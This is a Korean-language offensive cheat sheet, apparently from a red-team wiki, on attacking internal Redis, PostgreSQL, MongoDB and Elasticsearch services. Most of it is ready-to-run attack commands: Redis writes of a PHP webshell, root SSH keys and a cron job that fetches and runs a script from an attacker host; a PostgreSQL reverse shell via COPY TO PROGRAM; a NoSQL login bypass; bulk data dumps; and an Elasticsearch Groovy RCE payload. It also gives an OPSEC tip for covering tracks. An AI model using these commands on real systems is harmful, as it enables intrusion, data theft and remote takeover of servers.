# Database / In-memory Services

내부망 정찰에서 자주 올라오는 DB 서비스들을 모았고, 각 서비스의 기본 공격 벡터를 정리했다.

---

## Redis (6379)

```bash
# 비인증 접근 확인 — 내부망에서 생각보다 자주 열려있다
redis-cli -h <target> ping
redis-cli -h <target> info
redis-cli -h <target> config get dir
redis-cli -h <target> keys '*'

# RCE 1: webshell 을 DocumentRoot 에 쓰기
redis-cli -h <target> config set dir /var/www/html/
redis-cli -h <target> config set dbfilename shell.php
redis-cli -h <target> set x '<?php system($_GET["c"]); ?>'
redis-cli -h <target> save

# RCE 2: authorized_keys 쓰기 (OpenSSH)
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
redis-cli -h <target> -x set ssh_key < key.txt
redis-cli -h <target> config set dir /root/.ssh/
redis-cli -h <target> config set dbfilename authorized_keys
redis-cli -h <target> save

# RCE 3: cron (Debian 계열)
redis-cli -h <target> set x '\n\n* * * * * root curl -s http://atk/s|bash\n\n'
redis-cli -h <target> config set dir /etc/cron.d/
redis-cli -h <target> config set dbfilename pwn
redis-cli -h <target> save

# RCE 4: Module Load (Redis 4.x+). RedisModules-ExecuteCommand
redis-cli -h <target> module load /tmp/exp.so
redis-cli -h <target> system.exec "id"
```

!!! tip "OPSEC"
    `SAVE` 하면 RDB 가 디스크에 써지니 원복 필요. `CONFIG RESETSTAT` 와 원래 `dir` / `dbfilename` 돌려놓는 거 까먹지 말 것.

---

## PostgreSQL (5432)

```bash
# 접근
psql -h <target> -U postgres -d postgres

# 버전 / superuser 확인
SELECT version();
SELECT rolname, rolsuper FROM pg_roles;

# 파일 읽기 (superuser 필요)
CREATE TABLE r(t TEXT);
COPY r FROM '/etc/passwd';
SELECT * FROM r;

# RCE (9.3+, COPY ... FROM PROGRAM)
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATK/4444 0>&1"';

# RCE (Large Objects) — msfvenom 으로 생성한 ELF payload 로딩
DROP TABLE IF EXISTS exp;
CREATE TABLE exp(data bytea);
INSERT INTO exp VALUES(...);

# 9.4+ CVE-2019-9193 : PROGRAM 문법이 기본 허용되던 시절
# 10+ : dblink / postgres_fdw 로 SSRF / 내부 DB pivot
SELECT dblink_connect('host=inner_db user=admin password=xxx dbname=secret');
```

---

## MongoDB (27017)

```bash
# 비인증 접근
mongo --host <target>
> show dbs
> use admin
> db.system.users.find()

# 자동화
python3 nosqlmap.py

# BSON injection (webapp 연계) — login bypass
POST /login
{"user": "admin", "pass": {"$ne": null}}
```

- MongoDB 3.0 이전: 기본 인증 없음.
- 3.0~3.6: binding 기본 `0.0.0.0`.
- 4.x+: 기본 localhost 만 binding.

---

## Elasticsearch (9200)

```bash
# 클러스터 정보 / 비인증 확인
curl -s http://<target>:9200/
curl -s http://<target>:9200/_cluster/health
curl -s http://<target>:9200/_cat/indices?v
curl -s "http://<target>:9200/_search?pretty&size=100"

# 민감 index 전수 dump
for idx in $(curl -s http://<target>:9200/_cat/indices | awk '{print $3}'); do
    curl -s "http://<target>:9200/$idx/_search?size=10000" > "dump_$idx.json"
done

# RCE (Groovy script CVE-2015-1427, 구버전 한정)
curl -XPOST http://<target>:9200/_search -d '
{"size":1,"script_fields":{"pwn":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}'
```

---

## MSSQL / MySQL / Oracle

각각 별도 문서:

- [MSSQL](mssql.md)
- [MySQL](mysql.md)

Oracle TNS (1521) / SAPRouter (3299) 같은 legacy 는 HackTricks 의 포트별 페이지 참고하는 편이 빠름.

---

## 내부망 DB 탐지 Quickwin

```bash
# nmap 서비스 스캔 - DB 포트 집중
nmap -Pn -n -sS -p 1433,1521,3306,3050,5000,5432,5984,6379,7199,8080,8529,9042,9200,11211,27017,28015,29015,50000 <subnet> --open

# nxc 로 MSSQL 같이 인증 기반 enum
nxc mssql <targets> -u user -p pass --sa-check
nxc mssql <targets> -u user -p pass -q "SELECT @@version"
```

---

## 참고

- dump 후 반출: [Data Exfiltration](../lifecycle/exfiltration.md)
- Webapp SQLi: [Web - SQL Injection](../web/index.md#sql-injection)
